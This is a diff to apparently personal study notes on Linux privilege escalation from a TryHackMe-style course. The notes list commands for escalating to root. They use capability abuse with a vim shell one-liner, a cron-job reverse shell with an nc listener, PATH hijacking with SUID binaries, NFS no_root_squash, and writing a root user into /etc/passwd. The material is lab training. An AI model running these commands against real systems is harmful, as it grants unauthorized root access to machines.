@@ -1,4 +1,4 @@
-- ## *Enumeration Commands*
+- ## Enumeration Commands
 	- `hostname` returns the host name of the target.
 	- `uname -a` returns information about the kernel.
 	- `cat /proc/version` returns information about system processes.
@@ -50,14 +50,14 @@
 		- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
 		- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 		- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)
-- ## *Kernel Exploitation*
+- ## Kernel Exploitation
 	- ### Steps
 		- Identify the kernel version.
 		- Search and find an exploit code for the kernel version. [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
 		- Run the exploit.
 	- ### **NOTE** 
 		- A failed kernel exploit could lead to a system crash.
-- ## *Sudo* 
+- ## Sudo 
 	- [GTFObins](https://gtfobins.github.io/)
 	- ### **Using Application functions**
 		- Some applications may not have an sudo exploit like `Apache2` server, a "hack" can be used to leak information using a function of the application. In case of `Apache2` the `-f` option specifies an alternative configuration file.
@@ -83,4 +83,39 @@
 		- Adding a new user that has root privileges.
 			- Use `openssl passwd -1 -salt THM password1` to get a the hash value of the password `password1` with a salt of `THM`
 			- Use the findings in `GTFObins` to add the user to the `/etc/passwd` file like so `hacker:<hash>:0:0:root:/root:/bin/bash`
-			
+- ## Capabilities
+	- Capabilities help manage at a more granular level. Used to increase the privilege level of a process or a binary.
+	- `getcap` tool lists enabled capabilities.
+	- `getcap -r / 2>/dev/null`
+	- For example, `vim`, if found in the list, could be used to open up a root shell using `vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` either `:py` or `:py3`.
+- ## Cron Jobs
+	- Used to run scripts or binaries at specific times. They run with the privilege of their owner not the current user.
+	- Cron jobs are saved as `crontabs`.
+	- Each user has their `crontab` file.
+	- `cat /etc/crontab` to view the system-wide cron jobs.
+	- Depending on the available tools on the machine, a reverse shell could be created.
+	- Script for a reverse shell.![](cron-reverse-shell-script.png)
+	- Put the script in the cron job file, then open a listener using `nc -lvnp 6666`.
+- ## PATH
+	- If the user has write permissions on a file that is found in the PATH variable, could potentially be used to hijack an application to run a script.
+	- Questions to check if it is exploitable:
+		- What directories are located in the $PATH variable?
+		- Does use have write permissions on any of these folders?
+		- Can you modify $PATH?
+		- Is there a script/application that can be started that will be affected by this vulnerability?
+	- Search for writable directories using `find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`, comparing this output to the output of `cat $PATH` to see which directories are writable.
+	- Depending on the findings, no writable directory could be found, a solution to this is to add the `/tmp/` to the `$PATH` variable since its writable to all. `export PATH=/tmp:$PATH`.
+	- Create a script that will start a system binary for example `thm`.![](path-script.png)
+	- Compile it to an executable using `gcc path.c -o path -w` then set SUID bit using `chmod u+s path`.
+	- Create a file inside `/tmp/` directory called `thm` that will open up a shell `echo "/bin/bash" > thm` and change the permissions using `chmod 777 thm`.
+- ## NFS
+	- Network File Sharing configuration is kept in `/etc/exports` file which can be read by users.
+	- The important option is the `no_root_squash`.![](no-root-squash.png)
+	- By default NFS will change the root user to `nfsnobody` and strip any file from operating with root privileges. if the `no_root_squash` option is set on writable share, we can create an executable with SUID bit set and run it on the target.
+	- ### Steps
+		- Find mountable shares using `showmount -e <ip>`.
+		- Mount one of the `no_root_squash` shares to our attacking machine using `mount -o rw <ip>:/<share> <attack machine path>`.
+		- Create an executable that spawns a shell.![](bash-script.png)
+		- Compile the code using `gcc nfs.c -o nfs -w`.
+		- Set the SUID bit using `chmod +s nfs`.
+		- Since the share is mounted on the attack machine, the files will be present on the target.
